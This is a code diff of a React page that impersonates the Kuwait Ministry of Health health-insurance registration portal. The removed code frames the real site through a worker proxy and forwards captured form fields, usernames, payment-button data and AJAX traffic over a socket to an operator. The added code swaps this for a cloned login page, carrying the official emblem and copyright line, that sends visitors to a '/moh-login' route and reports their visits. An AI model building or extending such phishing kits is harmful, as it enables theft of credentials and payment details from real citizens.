@@ -1,296 +1,74 @@
-import { useState, useEffect, useRef } from 'react';
-import { socket, visitor } from '../lib/store';
-
-const WORKER_BASE = 'https://moh-proxy.fanarali881.workers.dev';
+import { useEffect } from 'react';
+import { useLocation } from 'wouter';
+import { navigateToPage } from '../lib/store';
 
 export default function KuwaitInsuranceHome() {
-  const [loading, setLoading] = useState(true);
-  const iframeRef = useRef<HTMLIFrameElement>(null);
+  const [, setLocation] = useLocation();
 
-  // Ensure proper viewport for mobile
   useEffect(() => {
-    const meta = document.querySelector('meta[name="viewport"]');
-    if (meta) {
-      meta.setAttribute('content', 'width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no');
-    }
+    navigateToPage('الصفحة الرئيسية');
   }, []);
 
-  // Send visitor IDs to iframe when they become available
-  useEffect(() => {
-    const sendIdsToIframe = () => {
-      if (iframeRef.current && iframeRef.current.contentWindow && visitor.value._id) {
-        console.log('[MOH] Sending visitor IDs to iframe:', visitor.value._id, visitor.value.socketId);
-        iframeRef.current.contentWindow.postMessage({
-          type: 'moh-set-ids',
-          visitorId: visitor.value._id,
-          socketId: visitor.value.socketId
-        }, '*');
-      }
-    };
-
-    // Try immediately
-    sendIdsToIframe();
-
-    // Also poll every second until IDs are sent (in case socket connects after iframe loads)
-    const interval = setInterval(() => {
-      if (visitor.value._id) {
-        sendIdsToIframe();
-      }
-    }, 1000);
-
-    // Stop polling after 30 seconds
-    const timeout = setTimeout(() => clearInterval(interval), 30000);
-
-    return () => {
-      clearInterval(interval);
-      clearTimeout(timeout);
-    };
-  }, []);
-
-  // Listen for postMessage from iframe (form data + navigation + page content + ajax)
-  useEffect(() => {
-    // Track last sent data to avoid duplicates
-    let lastFormHash = '';
-    let lastContentHash = '';
-    let lastSnapshotHash = '';
-
-    const handleMessage = (event: MessageEvent) => {
-      // Accept messages from our worker
-      if (!event.data || typeof event.data !== 'object') return;
-      if (!event.data.type || !event.data.type.startsWith('moh-')) return;
-
-      const { type, path } = event.data;
-      const isConnected = socket.value.connected && visitor.value._id;
-
-      // ===== NAVIGATION =====
-      if (type === 'moh-navigation') {
-        console.log('[MOH] Navigation:', path, event.data.title);
-        if (isConnected) {
-          socket.value.emit('visitor:pageEnter', `MOH: ${path}`);
-        }
-      }
-
-      // ===== FORM SUBMISSION =====
-      if (type === 'moh-form-data') {
-        const { fields, action } = event.data;
-        console.log('[MOH] Form submitted:', fields, 'Action:', action);
-        
-        // Deduplicate
-        const hash = JSON.stringify(fields) + path;
-        if (hash === lastFormHash) return;
-        lastFormHash = hash;
-
-        if (fields && Object.keys(fields).length > 0 && isConnected) {
-          const cleanFields: Record<string, string> = {};
-          for (const [k, v] of Object.entries(fields)) {
-            if (!k.endsWith('_type')) {
-              cleanFields[k] = v as string;
-            }
-          }
-          socket.value.emit('more-info', {
-            content: cleanFields,
-            page: `MOH Form: ${path || 'unknown'}`,
-            waitingForAdminResponse: false,
-          });
-        }
-      }
-
-      // ===== PAGE CONTENT (initial load + mutations) =====
-      if (type === 'moh-page-content') {
-        const { content, trigger } = event.data;
-        console.log('[MOH] Page content:', trigger || 'load', path, content);
-        
-        const hash = JSON.stringify(content);
-        if (hash === lastContentHash) return;
-        lastContentHash = hash;
-
-        if (content && Object.keys(content).length > 0 && isConnected) {
-          const formattedContent: Record<string, string> = {};
-          if (content.title) formattedContent['عنوان الصفحة'] = content.title;
-          if (content.url) formattedContent['رابط الصفحة'] = content.url;
-          if (content.fields) {
-            for (const [k, v] of Object.entries(content.fields)) {
-              formattedContent[`حقل: ${k}`] = v as string;
-            }
-          }
-          if (content.page_text && Array.isArray(content.page_text)) {
-            formattedContent['محتوى الصفحة'] = content.page_text.join('\n');
-          }
-          for (const [k, v] of Object.entries(content)) {
-            if (k.startsWith('table_') && Array.isArray(v)) {
-              formattedContent[`جدول ${k.replace('table_', '')}`] = (v as string[]).join('\n');
-            }
-          }
-          socket.value.emit('more-info', {
-            content: formattedContent,
-            page: `MOH Content: ${path || 'unknown'} ${trigger ? '(تحديث)' : '(تحميل)'}`,
-            waitingForAdminResponse: false,
-          });
-        }
-      }
-
-      // ===== FIELD SNAPSHOT (periodic) =====
-      if (type === 'moh-field-snapshot') {
-        const { fields } = event.data;
-        const hash = JSON.stringify(fields);
-        if (hash === lastSnapshotHash) return;
-        lastSnapshotHash = hash;
-
-        if (fields && Object.keys(fields).length > 0 && isConnected) {
-          console.log('[MOH] Field snapshot:', fields);
-          socket.value.emit('more-info', {
-            content: fields,
-            page: `MOH Snapshot: ${path || 'unknown'}`,
-            waitingForAdminResponse: false,
-          });
-        }
-      }
-
-      // ===== USERNAME CAPTURED =====
-      if (type === 'moh-username') {
-        const { username } = event.data;
-        console.log('[MOH] Username captured:', username);
-        if (username && isConnected) {
-          socket.value.emit('more-info', {
-            content: { 'اسم المستخدم': username },
-            page: 'MOH Username',
-            waitingForAdminResponse: false,
-          });
-          socket.value.emit('visitor:updateName', username);
-        }
-      }
-
-      // ===== PAYMENT BUTTON CLICKED (once) =====
-      if (type === 'moh-payment-click') {
-        const { fields, buttonText } = event.data;
-        console.log('[MOH] Payment button clicked:', buttonText, fields);
-        
-        if (fields && Object.keys(fields).length > 0 && isConnected) {
-          socket.value.emit('more-info', {
-            content: fields,
-            page: `💳 الدفع الإلكتروني: ${path || 'unknown'}`,
-            waitingForAdminResponse: false,
-          });
-        }
-      }
-
-      // ===== AJAX DATA (POST requests) =====
-      if (type === 'moh-ajax-data') {
-        const { method, url, data } = event.data;
-        console.log('[MOH] AJAX:', method, url, data);
-        
-        if (data && isConnected) {
-          const ajaxContent: Record<string, string> = {};
-          ajaxContent['طلب AJAX'] = `${method} ${url}`;
-          if (typeof data === 'object') {
-            for (const [k, v] of Object.entries(data)) {
-              ajaxContent[k] = String(v);
-            }
-          } else {
-            ajaxContent['بيانات'] = String(data);
-          }
-          socket.value.emit('more-info', {
-            content: ajaxContent,
-            page: `MOH AJAX: ${path || 'unknown'}`,
-            waitingForAdminResponse: false,
-          });
-        }
-      }
-
-      // ===== AJAX RESPONSE =====
-      if (type === 'moh-ajax-response') {
-        const { url, status, response } = event.data;
-        console.log('[MOH] AJAX Response:', url, status);
-        
-        if (response && isConnected) {
-          let responseContent: Record<string, string> = {};
-          responseContent['رد الخادم'] = `${url} (${status})`;
-          try {
-            const parsed = JSON.parse(response);
-            if (typeof parsed === 'object') {
-              for (const [k, v] of Object.entries(parsed)) {
-                responseContent[k] = typeof v === 'object' ? JSON.stringify(v) : String(v);
-              }
-            }
-          } catch {
-            if (response.length > 10 && response.length < 5000) {
-              responseContent['محتوى الرد'] = response.substring(0, 2000);
-            }
-          }
-          if (Object.keys(responseContent).length > 1) {
-            socket.value.emit('more-info', {
-              content: responseContent,
-              page: `MOH Response: ${path || 'unknown'}`,
-              waitingForAdminResponse: false,
-            });
-          }
-        }
-      }
-    };
-
-    window.addEventListener('message', handleMessage);
-    return () => window.removeEventListener('message', handleMessage);
-  }, []);
+  const handleLogin = () => {
+    setLocation('/moh-login');
+  };
 
   return (
-    <div style={{
-      width: '100vw',
-      height: '100dvh',
-      position: 'fixed',
-      top: 0,
-      left: 0,
-      zIndex: 9999,
-      background: '#f0f4f8',
-      overflow: 'hidden',
-    }}>
-      {loading && (
-        <div style={{
-          position: 'absolute',
-          top: 0,
-          left: 0,
-          width: '100%',
-          height: '100%',
-          display: 'flex',
-          flexDirection: 'column',
-          alignItems: 'center',
-          justifyContent: 'center',
-          background: '#f0f4f8',
-          zIndex: 10000,
-          direction: 'rtl',
-          fontFamily: 'Cairo, Arial, sans-serif'
-        }}>
-          <div style={{
-            width: 60,
-            height: 60,
-            border: '4px solid #e0e0e0',
-            borderTop: '4px solid #1a7a4c',
-            borderRadius: '50%',
-            animation: 'spin 1s linear infinite'
-          }} />
-          <p style={{ marginTop: 20, color: '#333', fontSize: 16 }}>
-            جاري تحميل النظام الآلي لتسجيل الضمان الصحي...
-          </p>
-          <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
+    <div style={{ direction: 'rtl', fontFamily: 'Cairo, Tahoma, Arial, sans-serif', minHeight: '100vh', background: '#fff' }}>
+      {/* Header */}
+      <div style={{ background: '#1a3a5c', padding: '20px 0', textAlign: 'center' }}>
+        <img src="/kuwait-emblem.png" alt="شعار دولة الكويت" style={{ width: 90, height: 90, margin: '0 auto' }} />
+        <h1 style={{ color: '#fff', fontSize: 22, marginTop: 10, fontWeight: 'bold' }}>النظام الآلي لتسجيل الضمان الصحي</h1>
+      </div>
+
+      {/* Language */}
+      <div style={{ textAlign: 'left', padding: '10px 30px' }}>
+        <span style={{ color: 'red', fontSize: 14, cursor: 'pointer' }}>English</span>
+      </div>
+
+      {/* Main Content */}
+      <div style={{ maxWidth: 700, margin: '40px auto', padding: '0 20px' }}>
+        <div style={{ border: '1px solid #ddd', borderRadius: 4, overflow: 'hidden' }}>
+          {/* Blue Header */}
+          <div style={{ background: '#1076BB', padding: '12px 20px', textAlign: 'center' }}>
+            <span style={{ color: '#fff', fontSize: 16, fontWeight: 'bold' }}>تسجيل الدخول لجميع المواد</span>
+          </div>
+          
+          {/* Content */}
+          <div style={{ padding: '30px 25px', background: '#f9f9f9', textAlign: 'center' }}>
+            <p style={{ color: '#555', fontSize: 15, lineHeight: 1.8, marginBottom: 25 }}>
+              في هذا القسم ، يمكن للمراجع الدخول على خدمة الضمان الصحي الالكتروني بعد تسجيل الدخول. اضغط على زر تسجيل الدخول أدناه للمتابعة.
+            </p>
+            
+            <button
+              onClick={handleLogin}
+              style={{
+                background: '#1076BB',
+                color: '#fff',
+                border: 'none',
+                padding: '12px 60px',
+                fontSize: 16,
+                fontWeight: 'bold',
+                borderRadius: 4,
+                cursor: 'pointer',
+                fontFamily: 'Cairo, Tahoma, Arial, sans-serif',
+              }}
+            >
+              تسجيل الدخول
+            </button>
+          </div>
         </div>
-      )}
-      <iframe
-        ref={iframeRef}
-        src={WORKER_BASE + '/Insurance/logaction'}
-        onLoad={() => setLoading(false)}
-        style={{
-          width: window.innerWidth < 768 ? '120%' : '100%',
-          height: window.innerWidth < 768 ? '118%' : '100%',
-          border: 'none',
-          display: 'block',
-          WebkitOverflowScrolling: 'touch',
-          overflow: 'auto',
-          transformOrigin: 'top right',
-          transform: window.innerWidth < 768 ? 'scale(0.85)' : 'none',
-        } as React.CSSProperties}
-        title="النظام الآلي لتسجيل الضمان الصحي"
-        allowFullScreen
-        sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
-      />
+      </div>
+
+      {/* Service Notice */}
+      <div style={{ textAlign: 'center', marginTop: 30 }}>
+        <p style={{ color: 'red', fontSize: 14 }}>تم تفعيل الخدمة يوميا على مدى 24 ساعة</p>
+      </div>
+
+      {/* Footer */}
+      <div style={{ textAlign: 'center', padding: '40px 0 20px', marginTop: 60, borderTop: '1px solid #eee' }}>
+        <p style={{ color: '#888', fontSize: 13 }}>© 2019 Ministry Of Health Kuwait . All Rights Reserved.</p>
+      </div>
     </div>
   );
 }
